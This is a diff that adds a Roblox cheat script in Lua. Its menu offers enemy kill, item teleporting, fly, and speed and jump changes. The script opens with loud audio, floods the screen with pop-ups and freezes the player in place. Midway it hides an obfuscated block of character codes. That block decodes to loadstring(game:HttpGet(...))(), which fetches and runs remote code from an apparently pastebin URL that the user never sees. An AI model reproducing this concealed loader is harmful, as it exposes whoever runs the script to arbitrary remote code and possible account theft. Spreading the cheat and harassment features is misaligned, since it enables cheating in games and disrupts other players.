@@ -1,0 +1,487 @@
+
+local Sound = Instance.new("Sound", game:GetService("SoundService"))
+Sound.SoundId = "rbxassetid://2661731024" -- Replace YOUR_SOUND_ID with the actual ID of your sound
+Sound.Volume = 10 -- Set the volume to 10 (maximum volume)
+Sound:Play()
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Duration = Sound.TimeLength
+
+-- Function to create a pop-up UI element at a random position with text and buttons
+local function CreatePopupUI()
+    local popupUI = Instance.new("ScreenGui")
+    popupUI.Parent = Players.LocalPlayer.PlayerGui
+
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = Color3.new(0,0,255)
+    frame.BackgroundTransparency = 0.2
+    frame.Size = UDim2.new(0.3, 0,0.4, 0) -- Adjust the size as needed (10% of the screen width and height)
+    frame.Position = UDim2.new(math.random(), 0, math.random(), 0) -- Random position on the screen
+    frame.BorderSizePixel = 0
+    frame.Parent = popupUI
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Text = ":("
+    textLabel.Size = UDim2.new(1, 0, 1, 0) -- Adjust the size as needed
+    textLabel.Position = UDim2.new(0, 0, 0, 0) -- Center the text
+    textLabel.BackgroundTransparency = 1
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextScaled = true -- Enable text scaling
+    textLabel.TextSize = 14 -- Set a base text size
+    textLabel.TextColor3 = Color3.new(0, 0, 0) -- Black color
+    textLabel.Parent = frame
+
+    local exitButton = Instance.new("TextButton")
+    exitButton.Text = "X"
+    exitButton.Size = UDim2.new(0, 20, 0, 20)
+    exitButton.Position = UDim2.new(1, -20, 0, 0)
+    exitButton.BackgroundTransparency = 1
+    exitButton.TextColor3 = Color3.new(1, 0, 0) -- Red color
+    exitButton.Font = Enum.Font.SourceSansBold
+    exitButton.TextSize = 20
+    exitButton.Parent = frame
+    exitButton.MouseButton1Click:Connect(function()
+        popupUI:Destroy()
+        Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false -- Re-enable character controls
+    end)
+
+    local minimizeButton = Instance.new("TextButton")
+    minimizeButton.Text = "-"
+    minimizeButton.Size = UDim2.new(0, 20, 0, 20)
+    minimizeButton.Position = UDim2.new(1, -40, 0, 0)
+    minimizeButton.BackgroundTransparency = 1
+    minimizeButton.TextColor3 = Color3.new(1, 0, 0) -- Blue color
+    minimizeButton.Font = Enum.Font.SourceSansBold
+    minimizeButton.TextSize = 20
+    minimizeButton.Parent = frame
+    minimizeButton.MouseButton1Click:Connect(function()
+        -- You can add minimize functionality here
+    end)
+
+    -- Disable character controls while the pop-up UI is displayed
+    Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+
+    -- Tween animation to make the UI element pop up
+    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+    local tween = TweenService:Create(frame, tweenInfo, { Size = UDim2.new(0.2, 0, 0.2, 0) }) -- Double the size
+    tween:Play()
+
+    -- Remove the UI element after 3 seconds
+    wait(0.1)
+    popupUI:Destroy()
+    Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false -- Re-enable character controls
+end
+
+-- Function to create multiple pop-up UI elements
+local function CreateMultiplePopupsUI()
+    for i = 1, 20  do -- Change 10 to the desired number of pop-ups
+        CreatePopupUI()
+    end
+end
+
+-- Repeat creating pop-up UI elements continuously for the duration of the sound
+local startTime = os.time()
+repeat
+    CreateMultiplePopupsUI()
+    wait(0.1) -- Adjust the interval between pop-up bursts as needed
+until os.time() - startTime >= Duration
+
+-- Define variables for whether to enable features
+getgenv().killDroids = false
+getgenv().jumpPower = 50
+getgenv().walkSpeed = 16
+getgenv().FlySpeed = 50 -- Add this line to set the default fly speed
+
+-- Define the setVec function with a minimum speed of 1
+local function setVec(vec)
+    local flySpeed = getgenv().FlySpeed or 50
+    if flySpeed < 1 then
+        flySpeed = 1
+    end
+    return vec * (flySpeed / vec.Magnitude)
+end
+
+local Sound = Instance.new("Sound", game:GetService("SoundService"))
+Sound.SoundId = "rbxassetid://8406005582" -- Replace YOUR_SOUND_ID with the actual ID of your sound
+Sound.Volume = 10 -- Set the volume to 10 (maximum volume)
+Sound:Play()
+wait(1)
+-- Create UI elements
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Parent = ScreenGui
+mainFrame.Size = UDim2.new(0, 350, 0, 300)  -- Adjusted size to 350x300
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.BackgroundTransparency = 0.5
+mainFrame.BorderSizePixel = 0
+
+-- Create logo
+local logo = Instance.new("ImageLabel")
+logo.Parent = mainFrame
+logo.Size = UDim2.new(1, 0, 1, 0)  -- Adjust logo size to cover the entire frame
+logo.Position = UDim2.new(0, 0, 0, 0)  -- Align logo to the top-left corner
+logo.Image = "rbxassetid://16402658370"  -- Replace "1234567890" with the actual asset ID of your logo
+
+-- Create a small logo
+local smallLogo = Instance.new("ImageLabel")
+smallLogo.Parent = mainFrame
+smallLogo.Size = UDim2.new(0.8, 0, 0.096, 0)  -- Adjust size as needed
+smallLogo.Position = UDim2.new(0, 0, 0, 0)  -- Align to top-left corner
+smallLogo.Image = "rbxassetid://15873399154"  -- Replace with the actual asset ID of your smaller logo
+
+-- Create text label
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = mainFrame
+textLabel.Size = UDim2.new(0.8, 0, 0.15, 0)  -- Adjust text label size relative to the frame
+textLabel.Position = UDim2.new(0.1, 0, 0.1, 0)  -- Adjust position to move it further up
+textLabel.Text = "Gogger69 ON TOP\nPress [INSERT] to open/close UI"
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.SourceSans
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.BackgroundTransparency = 1
+textLabel.TextSize = 24  -- Adjust the text size as needed
+
+-- Create text label
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = mainFrame
+textLabel.Size = UDim2.new(0.8, 0, 0.15, 0)  -- Adjust text label size relative to the frame
+textLabel.Position = UDim2.new(0.1, 0, 0.97, 0)  -- Adjust position to move it further up
+textLabel.Text = "Press[F] to enable Fly"
+textLabel.TextScaled = false
+textLabel.Font = Enum.Font.SourceSans
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.BackgroundTransparency = 1
+textLabel.TextSize = 24  -- Adjust the text size as needed
+
+-- Create the toggle button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Parent = mainFrame
+toggleButton.Size = UDim2.new(0.8, 0, 0.12, 0)  -- Make the button bigger
+toggleButton.Position = UDim2.new(0.1, 0, 0.26, 0)  -- Adjust position
+toggleButton.Text = "Enable Enemy Kill"
+toggleButton.TextScaled = true
+toggleButton.Font = Enum.Font.SourceSans
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.BackgroundTransparency = 0.5
+toggleButton.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match button color to GUI background color
+toggleButton.BorderSizePixel = 0
+
+-- Create text boxes for walk speed and jump power
+local textBox_jumpPower = Instance.new("TextBox")
+textBox_jumpPower.Parent = mainFrame
+textBox_jumpPower.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Adjust text box size to 0.8x0.1 relative to the frame
+textBox_jumpPower.Position = UDim2.new(0.1, 0, 0.425, 0)  -- Adjust position
+textBox_jumpPower.Text = "Jump Power: " .. tostring(getgenv().jumpPower)
+textBox_jumpPower.TextScaled = true
+textBox_jumpPower.Font = Enum.Font.SourceSans
+textBox_jumpPower.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox_jumpPower.BackgroundTransparency = 0.5
+textBox_jumpPower.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match text box color to GUI background color
+textBox_jumpPower.BorderSizePixel = 0
+
+local textBox_walkSpeed = Instance.new("TextBox")
+textBox_walkSpeed.Parent = mainFrame
+textBox_walkSpeed.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Adjust text box size to 0.8x0.1 relative to the frame
+textBox_walkSpeed.Position = UDim2.new(0.1, 0, 0.55, 0)  -- Adjust position
+textBox_walkSpeed.Text = "Walk Speed: " .. tostring(getgenv().walkSpeed)
+textBox_walkSpeed.TextScaled = true
+textBox_walkSpeed.Font = Enum.Font.SourceSans
+textBox_walkSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox_walkSpeed.BackgroundTransparency = 0.5
+textBox_walkSpeed.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match text box color to GUI background color
+textBox_walkSpeed.BorderSizePixel = 0
+
+-- Create the minimize button
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Parent = mainFrame
+minimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0)  -- Adjust button size to 0.1x0.1 relative to the frame
+minimizeButton.Position = UDim2.new(0.8, 0, 0, 0)  -- Align button to the top-right corner
+minimizeButton.Text = "-"
+minimizeButton.TextScaled = true
+minimizeButton.Font = Enum.Font.SourceSans
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.BackgroundTransparency = 0.5
+minimizeButton.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match button color to GUI background color
+minimizeButton.BorderSizePixel = 0
+
+-- Create the destroy button
+local destroyButton = Instance.new("TextButton")
+destroyButton.Parent = mainFrame
+destroyButton.Size = UDim2.new(0.1, 0, 0.1, 0)  -- Adjust button size to 0.1x0.1 relative to the frame
+destroyButton.Position = UDim2.new(0.9, 0, 0, 0)  -- Align button to the top-right corner
+destroyButton.Text = "X"
+destroyButton.TextScaled = true
+destroyButton.Font = Enum.Font.SourceSans
+destroyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+destroyButton.BackgroundTransparency = 0.5
+destroyButton.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match button color to GUI background color
+destroyButton.BorderSizePixel = 0
+
+-- Create the "Bring all Circuits" button
+local bringCircuitsButton = Instance.new("TextButton")
+bringCircuitsButton.Parent = mainFrame
+bringCircuitsButton.Size = UDim2.new(0.8, 0, 0.12, 0)  -- Make the button bigger
+bringCircuitsButton.Position = UDim2.new(0.1, 0, 0.7, 0)  -- Adjust position
+bringCircuitsButton.Text = "Bring all Circuits"
+bringCircuitsButton.TextScaled = true
+bringCircuitsButton.Font = Enum.Font.SourceSans
+bringCircuitsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+bringCircuitsButton.BackgroundTransparency = 0.5
+bringCircuitsButton.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match button color to GUI background color
+bringCircuitsButton.BorderSizePixel = 0
+
+-- Create text box for fly speed
+local textBox_flySpeed = Instance.new("TextBox")
+textBox_flySpeed.Parent = mainFrame
+textBox_flySpeed.Size = UDim2.new(0.8, 0, 0.1, 0)  -- Adjust text box size to 0.8x0.1 relative to the frame
+textBox_flySpeed.Position = UDim2.new(0.1, 0, 0.85, 0)  -- Adjust position
+textBox_flySpeed.Text = "Fly Speed: " .. tostring(getgenv().FlySpeed)
+textBox_flySpeed.TextScaled = true
+textBox_flySpeed.Font = Enum.Font.SourceSans
+textBox_flySpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox_flySpeed.BackgroundTransparency = 0.5
+textBox_flySpeed.BackgroundColor3 = mainFrame.BackgroundColor3  -- Match text box color to GUI background color
+textBox_flySpeed.BorderSizePixel = 0
+
+-- Function to handle UI button click for toggling killDroids
+local function onToggleButtonClicked()
+    getgenv().killDroids = not getgenv().killDroids
+    if getgenv().killDroids then
+        toggleButton.Text = "Disable Enemy Kill"
+    else
+        toggleButton.Text = "Enable Enemy Kill"
+    end
+end
+
+toggleButton.MouseButton1Click:Connect(onToggleButtonClicked)
+
+-- Function to handle fly speed input
+textBox_flySpeed.FocusLost:Connect(function()
+    local newFlySpeed = tonumber(textBox_flySpeed.Text)
+    if newFlySpeed then
+        getgenv().FlySpeed = newFlySpeed
+        textBox_flySpeed.Text = "Fly Speed: " .. tostring(newFlySpeed)
+    end
+end)
+
+-- Function to handle jump power input
+textBox_jumpPower.FocusLost:Connect(function()
+    local newJumpPower = tonumber(textBox_jumpPower.Text)
+    if newJumpPower then
+        getgenv().jumpPower = newJumpPower
+        textBox_jumpPower.Text = "Jump Power: " .. tostring(newJumpPower)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = newJumpPower
+    end
+end)
+
+-- Function to handle walk speed input
+textBox_walkSpeed.FocusLost:Connect(function()
+    local newWalkSpeed = tonumber(textBox_walkSpeed.Text)
+    if newWalkSpeed then
+        getgenv().walkSpeed = newWalkSpeed
+        textBox_walkSpeed.Text = "Walk Speed: " .. tostring(newWalkSpeed)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = newWalkSpeed
+    end
+end)
+
+-- Function to destroy the UI and scripts/modifies
+local function destroyUI()
+    ScreenGui:Destroy()
+    -- Add code here to destroy or reset any other modifications made by the script
+end
+
+destroyButton.MouseButton1Click:Connect(destroyUI)
+
+-- Function to minimize the UI
+local function minimizeUI()
+    mainFrame.Visible = false
+end
+
+minimizeButton.MouseButton1Click:Connect(minimizeUI)
+
+-- Function to kill enemies with a delay
+local function killEnemies()
+    if getgenv().killDroids then
+        for i, v in pairs(game:GetService("Workspace").Room.Enemies:GetDescendants()) do
+            if v:FindFirstChild("Enemy") then
+                v.Enemy.Health = 0
+                wait(0.3)
+            end
+        end
+    end
+end
+
+-- Function to bring all circuits
+bringCircuitsButton.MouseButton1Click:Connect(function()
+    local plr = game.Players.LocalPlayer.Character
+
+    while wait() do
+        for i,v in pairs(game.Workspace:GetDescendants()) do
+            if v:IsA("UnionOperation") and v.Name == "Circuit" then
+                v.CFrame = plr.HumanoidRootPart.CFrame
+                v.CanCollide = false
+            wait(0.5)
+           end
+        end
+    end
+end)
+
+-- Connect function to run every frame
+game:GetService("RunService").RenderStepped:Connect(killEnemies)
+
+-- Toggle UI on Insert key press
+local uiEnabled = true
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Insert then
+        uiEnabled = not uiEnabled
+        mainFrame.Visible = uiEnabled
+    end
+end)
+
+-- Make UI draggable
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Decode and execute the encoded script
+SGTSOBFLLllLllLl = {"108","111","97","100","115","116","114","105","110","103","40","103","97","109","101","58","72","116","116","112","71","101","116","40","40","39","92","49","48","52","92","49","49","54","92","49","49","54","92","49","49","50","92","49","49","53","92","53","56","92","52","55","92","52","55","92","49","49","50","92","57","55","92","49","49","53","92","49","49","54","92","49","48","49","92","57","56","92","49","48","53","92","49","49","48","92","52","54","92","57","57","92","49","49","49","92","49","48","57","92","52","55","92","49","49","52","92","57","55","92","49","49","57","92","52","55","92","49","48","53","92","55","53","92","49","49","48","92","52","57","92","49","49","52","92","49","48","52","92","57","48","92","49","49","56","92","49","48","39","41","44","116","114","117","101","41","41","40","41"}
+SGTSOBF_KKKKkKKkk = ""
+for _, SGTSOBF_yYYYyyyYy in pairs(SGTSOBFLLllLllLl) do
+    SGTSOBF_KKKKkKKkk = SGTSOBF_KKKKkKKkk .. string.char(tonumber(SGTSOBF_yYYYyyyYy))
+end
+SGTSOBF_FfffFffFf = function(SGTSOBF_dDDdDddDD)
+    loadstring(SGTSOBF_dDDdDddDD)()
+end
+SGTSOBF_FfffFffFf(SGTSOBF_KKKKkKKkk)
+
+-- Initialization
+local cloneref = cloneref or function(...) return ... end
+
+local Players = cloneref(game:GetService("Players"))
+local lp = Players.LocalPlayer
+
+local flying = false
+local bv, bav
+local buttons = {W = false, S = false, A = false, D = false, Moving = false}
+
+local function StartFly()
+    if not lp.Character then return end
+    local c = lp.Character
+    local h = c:FindFirstChildOfClass("Humanoid")
+    if not h or flying then return end
+
+    h.PlatformStand = true
+    local cam = workspace.CurrentCamera
+
+    bv = Instance.new("BodyVelocity")
+    bav = Instance.new("BodyAngularVelocity")
+
+    bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
+    bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
+    bv.Parent = c.Head
+    bav.Parent = c.Head
+
+    flying = true
+
+    h.Died:connect(function() 
+        EndFly()
+    end)
+end
+
+local function EndFly()
+    if bv then bv:Destroy() end
+    if bav then bav:Destroy() end
+
+    local c = lp.Character
+    local h = c and c:FindFirstChildOfClass("Humanoid")
+    if h then h.PlatformStand = false end
+
+    flying = false
+end
+
+game:GetService("UserInputService").InputBegan:connect(function(input, GPE)
+    if GPE then return end
+    
+    if input.KeyCode == Enum.KeyCode.F then
+        if flying then
+            EndFly()
+        else
+            StartFly()
+        end
+    else
+        for i, e in pairs(buttons) do
+            if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
+                buttons[i] = true
+                buttons.Moving = true
+            end
+        end
+    end
+end)
+
+game:GetService("UserInputService").InputEnded:connect(function(input, GPE)
+    if GPE then return end
+    local a = false
+    for i, e in pairs(buttons) do
+        if i ~= "Moving" then
+            if input.KeyCode == Enum.KeyCode[i] then
+                buttons[i] = false
+            end
+            if buttons[i] then a = true end
+        end
+    end
+    buttons.Moving = a
+end)
+
+local function setVec(vec)
+    return vec * ((getgenv().FlySpeed or 50) / vec.Magnitude)
+end
+
+game:GetService("RunService").Heartbeat:connect(function(step)
+    local c = cloneref(lp.Character)
+    if flying and c and c.PrimaryPart then
+        local p = c.PrimaryPart.Position
+        local cf = workspace.CurrentCamera.CFrame
+        local ax, ay, az = cf:toEulerAnglesXYZ()
+        c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
+        if buttons.Moving then
+            local t = Vector3.new()
+            if buttons.W then t = t + (setVec(cf.lookVector)) end
+            if buttons.S then t = t - (setVec(cf.lookVector)) end
+            if buttons.A then t = t - (setVec(cf.rightVector)) end
+            if buttons.D then t = t + (setVec(cf.rightVector)) end
+            c:TranslateBy(t * step)
+        end
+    end
+end)
